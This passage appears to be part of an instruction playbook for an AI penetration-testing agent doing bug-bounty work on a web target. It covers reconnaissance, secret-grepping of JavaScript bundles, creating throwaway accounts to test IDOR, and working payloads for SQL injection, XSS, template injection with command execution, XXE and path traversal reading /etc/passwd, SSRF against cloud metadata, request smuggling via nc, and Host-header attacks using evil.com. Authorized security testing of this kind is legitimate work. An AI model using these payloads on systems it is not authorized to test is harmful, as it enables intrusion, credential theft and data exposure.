grep -oE '"/(v[0-9]+|access|admin|auth|connect)/[^"]*"' /tmp/bundle.js | sort -u  # Versioned paths
grep -oE '[a-z]+\.(vanhack|TARGET_DOMAIN)\.[a-z]+' /tmp/bundle.js | sort -u   # Subdomains
grep -oE '(apiUrl|baseURL|API_URL|apiBase)[^,]*' /tmp/bundle.js | head -10     # API base URLs
grep -oE '(token|secret|key|password|api_key)\s*[:=]\s*"[^"]*"' /tmp/bundle.js # Leaked secrets
` + "`" + `

**Iteration 4: Test ALL discovered subdomains + API bases**
` + "`" + `bash` + "`" + `
# For each subdomain/API base found in JS:
for host in SUBDOMAINS_FROM_STEP3; do
  echo "--- $host ---"
  curl -skI "https://$host" -A "Mozilla/5.0" --max-time 10 2>&1 | head -20
done
# Check common API paths on each live host:
for path in /swagger.json /swagger/v1/swagger.json /swagger/v2/swagger.json /api-docs /graphql /.well-known/openid-configuration /actuator /health; do
  curl -skI "https://TARGET$path" -A "Mozilla/5.0" --max-time 5 2>&1 | head -5
done
` + "`" + `

**Iteration 5: Save complete endpoint inventory**
` + "`" + `bash` + "`" + `
# Use add_note to save ALL discovered:
# - Live subdomains
# - API endpoints from JS
# - API bases (e.g., api.target.dev)
# - Technology stack
# - Any interesting headers or behaviors
# This note is your attack surface map for the rest of the scan.
` + "`" + `

⚠️ DO NOT skip to vulnerability testing until ALL 5 steps are done.
⚠️ Step 3 (JS bundle analysis) is where 80% of critical findings originate — be thorough.

## 1A: PASSIVE RECON (No direct contact with target - uses third-party sources)
` + "`" + `bash` + "`" + `
# DNS & Subdomain Enumeration (PASSIVE - no direct target contact)
# Use multiple passive sources for comprehensive coverage

# Certificate Transparency logs
curl -s "https://crt.sh/?q=%.TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sort -u > ./passive_crt.txt

# DNS aggregators (passive)
subfinder -d TARGET -o ./passive_subfinder.txt
findomain -t TARGET -u ./passive_findomain.txt -q 2>/dev/null || true
assetfinder --subs-only TARGET | tee ./passive_assetfinder.txt

# Passive DNS aggregation
curl -s "https://dns.bufferover.run/dns?q=.TARGET" | jq -r '.FDNS_A[]' 2>/dev/null | cut -d',' -f2 | sort -u > ./passive_dnsbufferover.txt
curl -s "https://dns.bufferover.run/dns?q=.TARGET" | jq -r '.RDNS[]' 2>/dev/null | cut -d',' -f1 | sort -u >> ./passive_dnsbufferover.txt

# Shodan DNS enumeration (if API key available)
# shodan dns subdomain TARGET 2>/dev/null || true

# Bing.com DNS search (passive)
# Use search engines to find subdomains
curl -s "https://www.bing.com/search?q=site:target.com" | grep -oP 'href="https?://[^"]+' | grep target.com | cut -d'/' -f3 | sort -u >> ./passive_bing.txt

# Google DNS enumeration (passive)
# Use Google to find subdomains
curl -s "https://www.google.com/search?q=site:target.com&num=500" | grep -oP 'href="https?://[^"]+' | grep target.com | cut -d'/' -f3 | sort -u >> ./passive_google.txt

# Merge all passive sources
cat ./passive_*.txt 2>/dev/null | sort -u > ./all_passive_subdomains.txt
wc -l ./all_passive_subdomains.txt

# Archive enumeration (PASSIVE - using historical data)
curl -s "https://web.archive.org/cdx/search/cdx?url=*.TARGET/*&output=json&fl=original&filter=statuscode:200" | jq -r '.[].original' 2>/dev/null | cut -d'/' -f3 | sort -u > ./archive_subdomains.txt

# GitHub Dorks (find exposed secrets, APIs, infrastructure)
# Use GitHub search to find target-related repos
# gh search code "TARGET" --owner --repo --match --json --limit 100 2>/dev/null || true

# Pastebin/Defcon/Dumpster search
curl -s "https://duckduckgo.com/html/?q=TARGET+password&ia=web" | grep -oP 'href="https?://[^"]+' | head -20 || true

# DNS Dumpster
curl -s "https://dnsdumpster.com/domain/TARGET/" | grep -oP 'href="https?://[^"]+' | grep TARGET | sort -u || true

# Passive subdomain takeovers check
curl -s "https://subdomain-takeover.cybersploit.com/subdomains/TARGET.json" 2>/dev/null || true

## 1B: ACTIVE RECON (Direct contact with target)
` + "`" + `bash` + "`" + `
# Active subdomain enumeration
subfinder -d TARGET -all -recursive -o ./active_subfinder.txt
# Use wordlists for brute-force
subfinder -d TARGET -w /usr/share/wordlists/subdomains.txt -o ./active_bruteforce.txt 2>/dev/null || true

# Merge ALL subdomains (passive + active)
cat ./all_passive_subdomains.txt ./active_*.txt 2>/dev/null | sort -u > ./all_subdomains.txt
wc -l ./all_subdomains.txt

# DNS Resolution - verify which subdomains are alive
cat ./all_subdomains.txt | dnsx -silent -a -resp -o ./dns_resolved.txt
cat ./all_subdomains.txt | dnsx -silent -aaaa -resp -o ./dns_resolved_ipv6.txt 2>/dev/null || true
cat ./all_subdomains.txt | dnsx -silent -mx -resp -o ./dns_mx.txt 2>/dev/null || true
cat ./all_subdomains.txt | dnsx -silent -txt -resp -o ./dns_txt.txt 2>/dev/null || true
cat ./all_subdomains.txt | dnsx -silent -ns -resp -o ./dns_ns.txt 2>/dev/null || true

# HTTP Probing - check which hosts are live and get info
cat ./all_subdomains.txt | httpx -silent -status-code -title -tech-detect -follow-redirects -o ./live_hosts.txt
cat ./live_hosts.txt | grep -E "^\[.*\]" | cut -d' ' -f1 > ./live_urls.txt
wc -l ./live_hosts.txt

# Port Scanning - comprehensive
nmap -sV -sC -T2 --max-rate RATE_LIMIT --scan-delay RATE_DELAY --top-ports 200 --open -oN ./nmap_full.txt --script=http-title,http-headers,http-methods,http-robots.txt TARGET
nmap -sU -T2 --max-rate RATE_LIMIT --scan-delay RATE_DELAY --top-ports 50 -oN ./nmap_udp.txt TARGET

# Technology fingerprinting
whatweb -v -a 3 https://TARGET 2>/dev/null
wappalyzer https://TARGET 2>/dev/null || true
curl -sI https://TARGET -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" | tee ./headers.txt

# WAF detection
wafw00f https://TARGET -a

## 1C: WEB CRAWLING & URL DISCOVERY
` + "`" + `bash` + "`" + `
# Crawling & URL discovery (use ALL tools, merge results)
gospider -s https://TARGET --depth 3 -o ./gospider/ 2>/dev/null
katana -u https://TARGET -d 5 -jc -kf -ef css,png,jpg,gif,svg,woff,ttf -o ./katana_urls.txt 2>/dev/null
hakrawler -url https://TARGET -depth 3 -plain -linkfinder 2>/dev/null | tee ./hakrawler.txt

# URL & archive mining (use ALL tools, merge results)
gau TARGET --threads RATE_LIMIT --o ./gau_urls.txt
waymore -i TARGET -mode U -oU ./waymore_urls.txt 2>/dev/null
waybackurls TARGET | sort -u | tee ./wayback_urls.txt
curl -s "https://web.archive.org/cdx/search/cdx?url=*.TARGET/*&output=json&fl=original" | jq -r '.[].original' 2>/dev/null | sort -u >> ./wayback_urls.txt

cat ./wayback_urls.txt ./gau_urls.txt ./waymore_urls.txt ./katana_urls.txt ./hakrawler.txt ./gospider/*.txt 2>/dev/null | sort -u > ./all_urls.txt
wc -l ./all_urls.txt

## 1D: PARAMETER DISCOVERY
` + "`" + `bash` + "`" + `
# Parameter discovery
paramspider -d TARGET -o ./paramspider_urls.txt 2>/dev/null
cat ./all_urls.txt ./paramspider_urls.txt 2>/dev/null | grep "=" | uro | tee ./urls_with_params.txt
cat ./all_urls.txt | grep -oP '[?&]\K[^=]+' | sort -u > ./all_params.txt
wc -l ./all_params.txt

# Hidden parameter discovery (CRITICAL)
cat ./live_hosts.txt | head -20 | awk '{print $1}' | while read url; do
  arjun -u "$url" --stable -o ./arjun_$(echo "$url" | md5sum | cut -c1-8).json 2>/dev/null
done

# Extract JS files and analyze
cat ./all_urls.txt | grep -E "\.js$" | sort -u > ./js_files.txt
cat ./js_files.txt | while read url; do curl -s "$url" | grep -oP '(?:api|\/v[0-9]|endpoint|token|secret|key|password|auth|admin)[^\s"'"'"']+' 2>/dev/null; done | sort -u > ./js_secrets.txt

## 1E: DNS & INFRASTRUCTURE
` + "`" + `bash` + "`" + `
# DNS records - comprehensive
dig TARGET ANY +noall +answer
dig TARGET MX NS TXT SOA AAAA +short
dig _dmarc.TARGET TXT +short
host -a TARGET 2>/dev/null
nslookup -type=any TARGET 2>/dev/null || true

# Reverse DNS lookup
dig -x TARGET +short 2>/dev/null || true

# SPF/DKIM/DMARC analysis
for sub in _dmarc _spf _dkim; do
  dig ${sub}._domainkey.TARGET TXT +short 2>/dev/null || true
done

# AS Number lookup
whois TARGET | grep -i "AS\|Origin\|NetName" | head -5 || true

## 1F: GATHER INFORMATION FROM PUBLIC SOURCES
` + "`" + `bash` + "`" + `
# LinkedIn enumeration (passive)
# Use recon-ng or LinkedIn search

# Email enumeration (passive)
theHarvester -d TARGET -b all -f ./emails.html 2>/dev/null || true

# S3 bucket enumeration (passive)
# Use cloud_enum or s3scanner
# cloud_enum.py -k TARGET 2>/dev/null || true

# GitHub recon (find exposed keys, tokens)
# Use gitrob or gitleaks
# gitrob TARGET --no-banner 2>/dev/null || true

# Paste site search
# Use pastenewspaper or dumpmon

# COMBINE ALL FINDINGS
cat ./*subdomains*.txt ./*urls*.txt 2>/dev/null | sort -u > ./complete_inventory.txt
wc -l ./complete_inventory.txt

# NOTE: After this phase, you should have:
# - All subdomains (passive + active)
# - All live hosts with tech stack
# - All URLs and parameters
# - All JS files and potential secrets
# - All DNS records
# - All ports and services
# - All potential attack vectors

# WHOIS & ASN
whois TARGET | grep -iE "org|admin|tech|name|email|phone|address|registrar|created|expires"
` + "`" + `

**AFTER RECON**: Save key findings with add_note. Note all live subdomains, open ports, endpoints, and tech stack.
**MANDATORY**: For EVERY URL with parameters in ./urls_with_params.txt, you MUST test them individually for XSS, SQLi, SSRF, SSTI. Do NOT just collect URLs and move on — test each one.

---

### PHASE 2: Manual Vulnerability Discovery (MANDATORY BEFORE ANY SCANNER)
**DO NOT run automated scanners yet. Understand the target first.**

For EACH endpoint/URL discovered in Phase 1:

` + "`" + `bash` + "`" + `
# 1. Send a baseline request and study the response
curl -sk "https://TARGET/endpoint?param=normalvalue" -o /tmp/baseline.txt
wc -c /tmp/baseline.txt
cat /tmp/baseline.txt | head -50

# 2. Test how the target handles special characters
curl -sk "https://TARGET/endpoint?param=test'\"<>(){}" -o /tmp/special.txt
diff <(wc -c /tmp/baseline.txt) <(wc -c /tmp/special.txt)  # Different size = interesting

# 3. Check if input is reflected in the response
curl -sk "https://TARGET/endpoint?param=XALG0R1XTEST" | grep -c "XALG0R1XTEST"

# 4. Test for SQL errors with a single quote
curl -sk "https://TARGET/endpoint?param='" | grep -iE "sql|syntax|mysql|postgres|oracle|error"

# 5. Test time-based behavior
time curl -sk "https://TARGET/endpoint?param=1' AND SLEEP(3)--" > /dev/null
time curl -sk "https://TARGET/endpoint?param=1" > /dev/null

# 6. Test for SSTI
curl -sk "https://TARGET/endpoint?param={{7*7}}" | grep "49"
` + "`" + `

**AFTER MANUAL TESTING**: You may optionally run nuclei as a SUPPLEMENT (not replacement):
` + "`" + `bash` + "`" + `
# Nuclei — run ONLY after manual testing, treat results as leads to verify manually
nuclei -u https://TARGET -severity critical,high,medium -rl RATE_LIMIT -c RATE_LIMIT -o ./nuclei_results.txt -stats
` + "`" + `

**CRITICAL: DO NOT trust scanner results blindly.**
- Nuclei findings MUST be manually verified before reporting
- Any scanner-only finding without manual exploitation proof = REJECTED
- Focus 80% of your time on MANUAL testing, 20% on scanners
- If only detected by tool but not manually exploitable → mark as INFO in notes, NOT as vulnerability

---

### PHASE 3: Directory & File Discovery
**DO NOT SKIP - Use multiple tools! Run ffuf, gobuster, dirsearch, and feroxbuster!**
**Check ALL status codes - 200, 301, 302, 401, 403, 500 - all may reveal content!**

` + "`" + `bash` + "`" + `
# Directory brute-forcing with multiple wordlists
gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt -t 1 --delay RATE_DELAY -x php,html,js,txt,bak,old,zip,sql,xml,json,conf,env,log,yml,yaml,toml,ini,cfg,asp,aspx,jsp -o ./dirs.txt --no-error -b 404
ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,201,301,302,307,403 -rate RATE_LIMIT -t RATE_LIMIT -recursion -recursion-depth 2 -o ./ffuf.json -of json

# Sensitive file probing (CRITICAL — test ALL of these)
` + "`" + `
` + "`" + `python` + "`" + `
import requests
sensitive = [
    '.env', '.env.bak', '.env.local', '.env.production', '.env.staging',
    '.git/HEAD', '.git/config', '.git/logs/HEAD', '.gitignore',
    '.svn/entries', '.svn/wc.db', '.hg/store/00manifest.i',
    '.DS_Store', 'Thumbs.db',
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php.old', 'wp-config.php.save',
    'config.php', 'configuration.php', 'settings.php', 'database.yml', 'config.yml',
    '.htaccess', '.htpasswd', 'web.config',
    'phpinfo.php', 'info.php', 'test.php', 'pi.php',
    'server-status', 'server-info', 'status', 'health', 'healthcheck',
    'debug', 'trace.axd', 'elmah.axd',
    'backup.sql', 'backup.zip', 'backup.tar.gz', 'dump.sql', 'db.sql', 'database.sql',
    'admin/', 'administrator/', 'wp-admin/', 'cpanel/', 'phpmyadmin/',
    'login', 'signin', 'register', 'signup', 'forgot-password', 'reset-password',
    'api/', 'api/v1/', 'api/v2/', 'swagger.json', 'swagger-ui.html', 'api-docs',
    'graphql', 'graphiql', 'console', 'actuator', 'actuator/env', 'actuator/health',
    'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
    '.well-known/security.txt', '.well-known/openid-configuration',
    'package.json', 'composer.json', 'Gemfile', 'requirements.txt',
    'readme.md', 'README.md', 'CHANGELOG.md', 'LICENSE',
    'error', 'errors', '404', '500', 'error_log', 'debug.log', 'access.log',
]
for path in sensitive:
    try:
        r = requests.get(f'https://TARGET/{path}', verify=False, timeout=5, allow_redirects=False)
        if r.status_code not in [404, 403, 500, 502, 503] and len(r.content) > 0:
            print(f'[{r.status_code}] /{path} ({len(r.content)} bytes)')
    except: pass
` + "`" + `

---

### PHASE 4: CORS & Cookie Analysis
⚠️ DO NOT waste time on SSL/TLS scans (testssl, sslscan) or missing security header audits.
⚠️ Missing headers (X-Frame-Options, CSP, HSTS) are ALWAYS marked Informative on HackerOne.
⚠️ SSL/TLS weak ciphers are OUT OF SCOPE.

**Focus on CORS exploitation (can be P2/High) and cookie security analysis:**
` + "`" + `bash` + "`" + `
# CORS testing — look for credential theft, not just header presence
for origin in "https://evil.com" "null" "https://TARGET.evil.com" "https://evil-TARGET"; do
  echo "--- Origin: $origin ---"
  curl -sk https://TARGET -H "Origin: $origin" -D - -o /dev/null | grep -i access-control
done
# If Access-Control-Allow-Credentials: true WITH a reflected/wildcard origin → read_skill(name="cors_exploitation") for full exploitation PoC

# Cookie analysis — look for session fixation and SameSite bypass, NOT missing flags
curl -sI https://TARGET | grep -i set-cookie
# Focus: Can you set cookies via subdomain? Is SameSite=None without Secure? Can you do session fixation?

# Tech fingerprinting (use for attack selection, NOT for reporting)
curl -sI https://TARGET | grep -iE "server|x-powered-by"
# Use this to decide WHICH vulnerability skills to load — not to report as a finding
` + "`" + `

---

### AUTHENTICATED TESTING (if credentials/API keys provided in instructions)

**Option 1: Traditional Login (username/password via browser)**
If credentials like "Login with: admin@email.com / Password123":
1. browser_action command=launch url=https://TARGET/login
2. browser_action command=snapshot → identify email/password fields (@e3, @e5, etc.)
3. browser_action command=type selector=@e3 text=admin@email.com
4. browser_action command=type selector=@e5 text=Password123
5. browser_action command=submit → auto-finds and clicks submit button
6. browser_action command=wait text=navigation → wait for redirect after login
7. browser_action command=get_cookies → capture session cookies (session_id, CSRF tokens, etc.)
8. browser_action command=save_session → save cookies for later use
9. NOW test authenticated endpoints using the session cookies with curl:
   curl -b "session_id=VALUE; csrf_token=VALUE" https://TARGET/api/user/profile

**Option 2: API Key Authentication**
If API credentials provided (e.g., "API: am_us_xxx, username: agentmail"):
1. Look for API documentation or endpoints
2. Try authentication endpoints: /api/auth, /api/login, /api/token
3. Test with: curl -H "Authorization: Bearer API_KEY" or -H "X-API-Key: API_KEY"
4. Test authenticated API endpoints with the token
5. Look for IDOR in API endpoints (change IDs in API calls)

**Option 3: Sign Up with AgentMail + Browser (RECOMMENDED for targets with registration)**
STEP-BY-STEP WORKFLOW:

Step 1 - Create email inbox:
  agentmail action=create_inbox username=xalgotest123
  → Saves: inbox_id=XXX, email=xalgotest123@agentmail.to

Step 2 - Navigate to signup page:
  browser_action command=launch url=https://TARGET/signup
  browser_action command=snapshot → identify all form fields

Step 3 - Fill the registration form:
  browser_action command=fill_form fields=email=xalgotest123@agentmail.to|password=SecureP@ss123!|name=Test User
  OR fill fields individually:
  browser_action command=type selector=@e3 text=xalgotest123@agentmail.to
  browser_action command=type selector=@e5 text=SecureP@ss123!
  browser_action command=type selector=@e7 text=Test User

Step 4 - Submit the form:
  browser_action command=submit
  browser_action command=wait text=navigation timeout=10
  browser_action command=snapshot → check for success message or errors

Step 5 - Get verification email:
  agentmail action=wait_for_email inbox_id=XXX subject=verify timeout=120
  → Extract the verification URL from the email body

Step 6 - Complete verification:
  browser_action command=goto url=VERIFICATION_URL_FROM_EMAIL
  browser_action command=wait text=navigation
  browser_action command=snapshot → confirm account is verified

Step 7 - Login with account A and save as named session:
  browser_action command=goto url=https://TARGET/login
  browser_action command=fill_form fields=email=xalgotest123@agentmail.to|password=SecureP@ss123!
  browser_action command=submit
  browser_action command=wait text=navigation
  browser_action command=get_cookies → capture session
  browser_action command=save_session session_name=user_a

Step 8 - Create second account and save as separate session:
  → Create a SECOND account using agentmail (different email, e.g. xalgotest456@agentmail.to)
  → Complete signup + verification flow for account B
  browser_action command=goto url=https://TARGET/login
  browser_action command=fill_form fields=email=xalgotest456@agentmail.to|password=SecureP@ss456!
  browser_action command=submit
  browser_action command=wait text=navigation
  browser_action command=save_session session_name=user_b

Step 9 - IDOR Two-Account Testing Workflow:
  With TWO sessions saved, perform IDOR and privilege escalation tests:
  a) Load user_a session → browse to profile/resource → note the resource ID/URL
     browser_action command=load_session session_name=user_a
  b) Load user_b session → try to access user_a's resource by modifying the ID
     browser_action command=load_session session_name=user_b
     browser_action command=goto url=https://TARGET/api/resource/USER_A_ID
  c) Compare responses — if user_b can see user_a's data → IDOR confirmed!
  d) Test API endpoints too: use get_cookies after load_session and send_request with those cookies
  e) Use list_sessions to see all saved sessions:
     browser_action command=list_sessions

IMPORTANT BROWSER TIPS:
- ALWAYS use snapshot before interacting — it shows you the exact element IDs
- Use fill_form for multi-field forms — faster than individual type commands
- Use submit instead of clicking — it auto-finds the submit button
- Use wait text=navigation after form submissions to wait for redirects
- Use get_cookies after login to capture session tokens for curl-based testing
- Use save_session session_name=NAME to save multiple account sessions by name
- Use load_session session_name=NAME to switch between accounts for IDOR testing
- Use list_sessions to see all saved sessions (memory + disk)
- If the page has iframes (e.g., CAPTCHA), use iframe/main_frame to switch context
- Use extract_links to find all links on a page (useful for navigation)

TIP: If the target requires email verification, ALWAYS use agentmail — it gives you real working email addresses instantly.

### Caido Proxy
All HTTP requests via the send_request tool are automatically routed through the Caido proxy (port 8080) for traffic analysis.
Use list_requests to see all captured HTTP traffic.

⚠️ **IMPORTANT: PREFER terminal_execute (curl) OVER send_request for ALL reconnaissance and analysis.**
- send_request truncates responses at 10KB — JS bundles, API responses, and HTML pages are often 50-500KB.
- Use curl via terminal_execute for: downloading pages, JS bundles, API probing, and any response you need to grep/analyze.
- Use send_request ONLY when you specifically need requests logged in the Caido proxy (e.g., authenticated session testing).
- NEVER use send_request to download JavaScript files — they WILL be truncated and you'll miss endpoints.

### Test Authenticated Endpoints
   - Test cookie theft via XSS after login


### PHASE 5: Authentication & Session Testing
- Test login forms for SQLi: ' OR 1=1--, admin'--,  " OR ""="
- Test for username enumeration (different error messages for valid vs invalid users)
- Test for password reset flaws (token prediction, host header injection)
- Test session fixation, session timeout, concurrent sessions
- Check cookie flags: HttpOnly, Secure, SameSite
- Test for default credentials: admin/admin, admin/password, test/test, root/root
- Test OAuth/OIDC flows for open redirect, token leakage, state parameter missing
- Test 2FA bypass: null value, empty value, reusing old codes, brute-force OTP
- Test JWT: none algorithm, weak secret (hashcat), key confusion, expired token reuse

` + "`" + `bash` + "`" + `
# JWT analysis (if JWT found in cookies/headers)
# Extract JWT from response headers or cookies, then:
python3 -c "
import base64,json,sys
token = 'PASTE_JWT_HERE'
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
print('Algorithm:', header.get('alg'))
if header.get('alg') == 'none': print('[VULN] Algorithm none accepted!')
"
` + "`" + `

---

### PHASE 6: Injection Testing — MANUAL FIRST, THEN AUTOMATE
**CRITICAL: You MUST test parameters MANUALLY before running sqlmap/dalfox.**
**Never blindly run automated scanners — understand how the target processes input first.**

#### Step 6A: Manual Parameter Analysis (MANDATORY)
For EACH discovered endpoint with parameters:

` + "`" + `bash` + "`" + `
# 1. Send a BASELINE request to understand normal behavior
curl -sk "https://TARGET/page?param=normalvalue" -o /tmp/baseline.txt
wc -c /tmp/baseline.txt  # Note response size

# 2. Test how the target handles special characters
curl -sk "https://TARGET/page?param=test'\"<>(){}" -o /tmp/special.txt
wc -c /tmp/special.txt  # Compare size — different = interesting

# 3. Check if input is REFLECTED in the response
curl -sk "https://TARGET/page?param=XALG0R1XTEST" | grep -c "XALG0R1XTEST"
# If reflected → potential XSS. Check encoding:
curl -sk "https://TARGET/page?param=<script>" | grep -o '&lt;script&gt;\|<script>'

# 4. Test for SQL error messages with single quote
curl -sk "https://TARGET/page?param='" | grep -iE "sql|syntax|mysql|postgres|oracle|sqlite|error|warning|exception"

# 5. Test for time-based behavior (SQLi indicator)
time curl -sk "https://TARGET/page?param=1' AND SLEEP(3)--" > /dev/null
time curl -sk "https://TARGET/page?param=1" > /dev/null
# Compare times — 3+ second difference = SQLi confirmed

# 6. Test numeric params differently
curl -sk "https://TARGET/page?id=1" -o /tmp/id1.txt
curl -sk "https://TARGET/page?id=2-1" -o /tmp/id_arith.txt
diff /tmp/id1.txt /tmp/id_arith.txt  # Same response = arithmetic SQLi

# 7. Check for template injection
curl -sk "https://TARGET/page?param={{7*7}}" | grep "49"
curl -sk "https://TARGET/page?param=\${7*7}" | grep "49"
` + "`" + `

#### Step 6B: Detailed Manual Testing per Vulnerability Class
**Only proceed here for parameters that showed interesting behavior in Step 6A.**

` + "`" + `python` + "`" + `
import requests, urllib.parse
requests.packages.urllib3.disable_warnings()

target_url = "https://TARGET/page"
param_name = "PARAM"

# --- XSS: Only test if parameter is REFLECTED ---
xss_payloads = [
    '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>', "'-alert(1)-'",
    '<svg/onload=alert(1)>', '<details/open/ontoggle=alert(1)>',
    '{{7*7}}', '${alert(1)}'
]
for p in xss_payloads:
    try:
        r = requests.get(f"{target_url}?{param_name}={urllib.parse.quote(p)}",
                        verify=False, timeout=10)
        # Check if payload appears UNENCODED in response
        if p in r.text or (p == '{{7*7}}' and '49' in r.text):
            print(f"[POTENTIAL XSS] Payload reflected unencoded: {p}")
            print(f"  Status: {r.status_code}, Content-Type: {r.headers.get('Content-Type')}")
    except Exception as e:
        print(f"Error: {e}")

# --- SQLi: Only test if single quote caused errors ---
sqli_payloads = [
    ("' OR '1'='1", "Boolean-based"), ("' AND '1'='2", "Boolean-based"),
    ("1 UNION SELECT NULL--", "UNION"), ("1 UNION SELECT NULL,NULL--", "UNION"),
    ("' AND SLEEP(5)--", "Time-based"), ("'; WAITFOR DELAY '0:0:5'--", "Time-based"),
    ("1; SELECT pg_sleep(5)--", "Time-based PostgreSQL"),
]
import time
for payload, sqli_type in sqli_payloads:
    try:
        start = time.time()
        r = requests.get(f"{target_url}?{param_name}={urllib.parse.quote(payload)}",
                        verify=False, timeout=15)
        elapsed = time.time() - start
        if sqli_type == "Time-based" and elapsed > 4:
            print(f"[CONFIRMED SQLi] Time-based: {payload} (took {elapsed:.1f}s)")
        elif "sql" in r.text.lower() or "syntax" in r.text.lower() or "error" in r.text.lower():
            print(f"[POTENTIAL SQLi] Error-based: {payload}")
            print(f"  Response snippet: {r.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")
` + "`" + `

#### Step 6C: Automated Scanner (ONLY after manual confirmation)
**Use sqlmap/dalfox ONLY on parameters that showed vulnerability indicators in Steps 6A/6B.**

` + "`" + `bash` + "`" + `
# SQLi — ONLY on URLs where manual testing showed SQL errors or time delays
# DO NOT run sqlmap on all URLs blindly
sqlmap -u "https://TARGET/page?param=value" --batch --level=3 --risk=2 --random-agent --threads=5 --output-dir=./sqlmap/ 2>/dev/null

# XSS — ONLY on URLs where manual testing showed reflection
echo "https://TARGET/page?param=test" | dalfox pipe --silence -o ./dalfox_xss.txt 2>/dev/null

# Command injection tests (manual first)
# Test params with: ;id, |id, $(id), ` + "`" + `id` + "`" + `, ; sleep 10, | sleep 10

# Template injection (SSTI) — only if {{7*7}} returned 49
# Test with: {{config}}, {{self.__class__.__mro__}}, ${T(java.lang.Runtime).getRuntime().exec("id")}

# Path traversal
# Test params with: ../../../etc/passwd, ....//....//etc/passwd, ..%2f..%2fetc%2fpasswd

# XXE (if XML input accepted)
# Test with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

# NoSQL Injection (if JSON-accepting endpoints detected)
# Test: curl -sk URL -X POST -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$gt":""}}'
# Test: curl -sk "URL?param[$ne]=&param2[$gt]=" (Express qs parser injection)
# Test: curl -sk URL -X POST -H "Content-Type: application/json" -d '{"$where":"sleep(3000)"}'

# CRLF Injection (test redirect/header reflection endpoints)
# Test: curl -sk "URL/redirect?url=test%0d%0aSet-Cookie:%20evil=true" -D - -o /dev/null
# Test: curl -sk "URL/redirect?url=test%0d%0a%0d%0a<script>alert(1)</script>" -D -

# Host Header Attacks (test password reset, redirects)
# Test: curl -sk URL/forgot-password -X POST -H "Host: evil.com" -d "email=victim@test.com"
# Test: curl -sk URL -H "X-Forwarded-Host: evil.com" | grep evil.com

# HTTP Request Smuggling (if behind proxy/CDN)
# Test CL.TE: printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc TARGET 80
# Test TE obfuscation variants: Transfer-Encoding: chunked with tabs, duplicates, capitalization

# Cache Poisoning (if CDN/cache detected via X-Cache, Age, cf-cache-status headers)
# Test: curl -sk "URL/?cb=$(date +%%s)" -H "X-Forwarded-Host: evil.com" | grep evil.com
# If reflected in cached response → XSS at CDN scale
` + "`" + `

---

### PHASE 7: SSRF Testing
` + "`" + `python` + "`" + `
import requests
ssrf_targets = [
    'http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/user-data/',
    'http://metadata.google.internal/computeMetadata/v1/', 'http://100.100.100.200/latest/meta-data/',
    'http://169.254.169.254/metadata/v1/', 'http://127.0.0.1:80', 'http://127.0.0.1:8080',
    'http://127.0.0.1:443', 'http://127.0.0.1:22', 'http://localhost:6379',
    'http://127.0.0.1:3306', 'http://127.0.0.1:27017', 'http://127.0.0.1:9200',
    'http://[::1]/', 'http://0x7f000001/', 'http://0177.0.0.1/',
    'gopher://127.0.0.1:25/', 'dict://127.0.0.1:6379/info',
    'file:///etc/passwd', 'file:///etc/hosts',
]
ssrf_params = ['url','redirect','uri','path','next','target','rurl','dest','data','reference',
               'site','html','val','domain','callback','return','return_to','checkout_url',
               'continue','go','image_url','open','page','feed','host','port','to','out',
               'view','dir','show','navigation','from','load','r','u','link','src','ref',
               'proxy','fetch','download','file','document','folder','pg','style','pdf',
               'template','php_path','doc','img','filename']
for param in ssrf_params:
    for target in ssrf_targets[:5]:
        try:
            r = requests.get(f'https://TARGET/?{param}={target}', verify=False, timeout=5, allow_redirects=False)
            if any(x in r.text.lower() for x in ['root:', 'ami-id', 'instance', 'computeMetadata', 'private_ip', 'hostname']):
                print(f'[VULN] SSRF via {param} -> {target}')
        except: pass
` + "`" + `

---

### PHASE 8: IDOR & Broken Access Control
- Test all authenticated endpoints with different user IDs
- Increment/decrement numeric IDs: /api/user/1, /api/user/2, /api/user/0
- Test UUID prediction and enumeration
- Test horizontal privilege escalation (access other user's data)
- Test vertical privilege escalation (access admin endpoints as regular user)
- Remove auth tokens and test if endpoints still work
- Test HTTP method override: X-HTTP-Method-Override, X-Method-Override
- Test path traversal on API: /api/v1/users/../admin/

---

### PHASE 9: API & GraphQL Testing
` + "`" + `python` + "`" + `
import requests, json
# Test common API endpoints
api_paths = ['api', 'api/v1', 'api/v2', 'api/v3', 'rest', 'graphql', 'graphiql',
             'swagger.json', 'swagger/v1/swagger.json', 'api-docs', 'openapi.json',
             'api/swagger', '_api', 'api/config', 'api/debug', 'api/admin', 'api/health',
             'api/status', 'api/info', 'api/version', 'api/users', 'api/user/1']
for path in api_paths:
    try:
        r = requests.get(f'https://TARGET/{path}', verify=False, timeout=5,
                        headers={'Accept': 'application/json'})
        if r.status_code not in [404, 403, 500]:
            print(f'[{r.status_code}] /{path} ({len(r.content)} bytes)')
            if r.headers.get('content-type','').startswith('application/json'):
                print(f'  JSON Response: {r.text[:200]}')
    except: pass

# GraphQL introspection
gql_query = {"query": "{__schema{types{name,fields{name,args{name}}}}}"}
for ep in ['graphql', 'graphiql', 'api/graphql', 'gql', 'query']:
    try:
        r = requests.post(f'https://TARGET/{ep}', json=gql_query, verify=False, timeout=5)
        if '__schema' in r.text:
            print(f'[VULN] GraphQL introspection enabled at /{ep}')
            types = r.json()['data']['__schema']['types']
            for t in types:
                if not t['name'].startswith('__'):
                    fields = [f['name'] for f in (t.get('fields') or [])]
                    print(f'  Type: {t["name"]} -> {fields[:10]}')
    except: pass
` + "`" + `

---

